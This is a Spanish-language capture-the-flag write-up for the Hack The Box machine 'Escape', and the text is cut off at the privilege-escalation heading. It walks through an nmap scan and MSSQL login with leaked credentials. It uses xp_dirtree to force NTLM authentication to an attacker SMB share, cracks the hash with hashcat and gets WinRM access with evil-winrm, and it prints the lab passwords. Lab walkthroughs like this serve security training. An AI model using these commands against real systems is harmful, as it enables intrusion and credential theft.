
![](https://github.com/hackthebox/writeup-templates/raw/master/machine/assets/images/banner.png)



<img src="https://labs.hackthebox.com/storage/avatars/80936664b3da83a92b28602e79e47d79.png" style="margin-left: 20px; zoom: 60%;" align=left />    	<font size="10">Escape</font>

​		28/04/2025

​		

​		

 



### Description:

This machine...

### Difficulty:

`MEDIUM`

### Flags:

User: `<md5>`

Root: `<md5>`

# Enumeration

```bash
nmap 10.10.11.202 -sCV --min-rate 5000 -v -Pn -oN escape.txt
```

```bash
# Nmap 7.95 scan initiated Mon Apr 28 11:11:28 2025 as: /usr/lib/nmap/nmap --privileged -sCV --min-rate 5000 -v -Pn -oN escape.txt 10.10.11.202
Nmap scan report for 10.10.11.202
Host is up (0.052s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-28 17:11:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
|_ssl-date: 2025-04-28T17:12:55+00:00; +8h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-28T17:12:56+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-28T17:07:44
| Not valid after:  2055-04-28T17:07:44
| MD5:   8849:9ff2:0bad:e276:4ef3:b780:b8c5:94e4
|_SHA-1: 218b:603f:7f15:3796:1cc9:c840:8a62:77cb:5bc0:054d
|_ssl-date: 2025-04-28T17:12:55+00:00; +8h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
|_ssl-date: 2025-04-28T17:12:55+00:00; +8h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
|_ssl-date: 2025-04-28T17:12:56+00:00; +8h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time: 
|   date: 2025-04-28T17:12:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 28 11:12:56 2025 -- 1 IP address (1 host up) scanned in 87.91 seconds

```

Podemos ver que esta el dominio sequel.htb

Tambien hay una carpeta compartida llamada Public con un pdf y dentro un usuario y contraseña.
![[Pasted image 20250428113052.png]]

PublicUser:GuestUserCantWrite1

Como vemos que tenemos mssql abierto, vamos a tratar de interntar de meternos en este servicio con la password que hemos conseguido.


```bash
impacket-mssqlclient  sequel.htb/PublicUser:GuestUserCantWrite1@sequel.htb
```

Como hemos conseguido acceso, ahora podemos aprovechar para conseguir un Hash ntlm gracias a la propiedad de mssqclient de EXEC xp_dirtree

por lo que levantaremos un smb share rapidamente con el modulo de impacket:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

y despues desde mssqclient ejecutaremos:

```bash
EXEC xp_dirtree '\\10.10.14.6\smbFolder'
```

y ahora podremos ver el hash:

![[Pasted image 20250428115636.png]]


ahora la crackeamos

```
hashcat -m 5600 'sql_svc::sequel:aaaaaaaaaaaaaaaa:af0cc6896b85e48c73799c6c744c9b62:010100000000000000c9456523b8db011b1f66547da31f85000000000100100074004d006100660072006400690068000300100074004d006100660072006400690068000200100072004c0051006c00580045006e0056000400100072004c0051006c00580045006e0056000700080000c9456523b8db0106000400020000000800300030000000000000000000000000300000f14706f602108f35b814201b66ccb08aa4875d0adf0ff77b619fe8ac3b0694e00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0036000000000000000000' /usr/share/wordlists/rockyou.txt --show
```

Ahora vemos si este usuario puede conectarse con evilwinrm

```bash
crackmapexec winrm 10.10.11.202 -u sql_svc  -p REGGIE1234ronnie
```

![[Pasted image 20250430074033.png]]

Vemos que pone pwned, por lo que podemos conectarnos.

```bash
evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
```




# Lateral Movement

Vemos que hay un archivo de logs en la carpeta de MySql asi que lo vemos
Aqui podemos encontrar un usuario y contraseña, asi que nos moveremos a este

![[Pasted image 20250430080150.png]]
sequel.htb\Ryan.Cooper:NuclearMosquito3

# Privilege Escalation